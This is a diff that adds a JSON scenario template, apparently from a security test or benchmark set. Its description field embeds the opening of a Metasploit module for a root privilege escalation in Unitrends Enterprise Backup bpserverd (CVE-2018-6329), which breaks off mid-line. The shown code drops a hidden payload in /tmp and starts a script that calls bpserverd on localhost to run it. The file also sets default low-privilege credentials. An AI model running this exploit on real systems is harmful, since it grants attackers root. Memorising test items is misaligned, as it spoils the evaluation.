@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_45913",
+  "category": "D1_credential",
+  "attack_technique": "T1552.001",
+  "cwe": "CWE-256",
+  "description": "Linux privilege escalation: Unitrends Enterprise Backup - bpserverd Privilege Escalation (Metasploit) (CVE-2018-6329)\n\nExploit source code (45913.rb):\n```\n##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ExcellentRanking\n\n  include Msf::Post::File\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n\n  def initialize(info={})\n    super(update_info(info, {\n      'Name'           => 'Unitrends Enterprise Backup bpserverd Privilege Escalation',\n      'Description'    => %q{\n        It was discovered that the Unitrends bpserverd proprietary protocol, as exposed via xinetd,\n        has an issue in which its authentication can be bypassed.  A remote attacker could use this\n        issue to execute arbitrary commands with root privilege on the target system.\n        This is very similar to exploits/linux/misc/ueb9_bpserverd however it runs against the\n        localhost by dropping a python script on the local file system.  Unitrends stopped\n        bpserverd from listening remotely on version 10.\n       },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Cale Smith', # @0xC413\n          'Benny Husted', # @BennyHusted\n          'Jared Arave', # @iotennui\n          'h00die' # msf adaptations\n        ],\n      'DisclosureDate' => 'Mar 14 2018',\n      'Platform'       => 'linux',\n      'Arch'           => [ARCH_X86],\n      'References'     =>\n        [\n          ['URL', 'https://support.unitrends.com/UnitrendsBackup/s/article/000005691'],\n          ['URL', 'http://blog.redactedsec.net/exploits/2018/04/20/UEB9_tcp.html'],\n          ['EDB', '44297'],\n          ['CVE', '2018-6329']\n        ],\n      'Targets'        =>\n        [\n          [ 'UEB <= 10.0', { } ]\n        ],\n      'DefaultOptions' => { 'PrependFork' => true, 'WfsDelay' => 2 },\n      'SessionTypes'   => ['shell', 'meterpreter'],\n      'DefaultTarget'  => 0\n      }\n    ))\n    register_advanced_options([\n      OptString.new(\"WritableDir\", [true, \"A directory where we can write files\", \"/tmp\"]),\n      OptInt.new(\"BPSERVERDPORT\", [true, \"Port bpserverd is running on\", 1743])\n    ])\n  end\n\n  def exploit\n\n    pl = generate_payload_exe\n    exe_path = \"#{datastore['WritableDir']}/.#{rand_text_alphanumeric 5..10}\"\n    print_status(\"Writing payload executable to '#{exe_path}'\")\n\n    write_file(exe_path, pl)\n    #register_file_for_cleanup(exe_path)\n\npe_script = %Q{\nimport socket\nimport binascii\nimport struct\nimport time\nimport sys\n\nRHOST = '127.0.0.1'\nXINETDPORT = #{datastore['BPSERVERDPORT']}\ncmd = \"#{exe_path}\"\n\ndef recv_timeout(the_socket,timeout=2):\n    the_socket.setblocking(0)\n    total_data=[];data='';begin=time.time()\n    while 1:\n        #if you got some data, then break after wait sec\n        if total_data and time.time()-begin>timeout:\n            break\n        #if you got no data at all, wait a little longer\n        elif time.time()-begin>timeout*2:\n            break\n        try:\n            data=the_socket.recv(8192)\n            if data:\n                total_d\n```",
+  "cve": "CVE-2018-6329",
+  "exploitdb_id": "45913",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_45913",
+      "type": "core",
+      "difficulty": "easy"
+    }
+  ]
+}
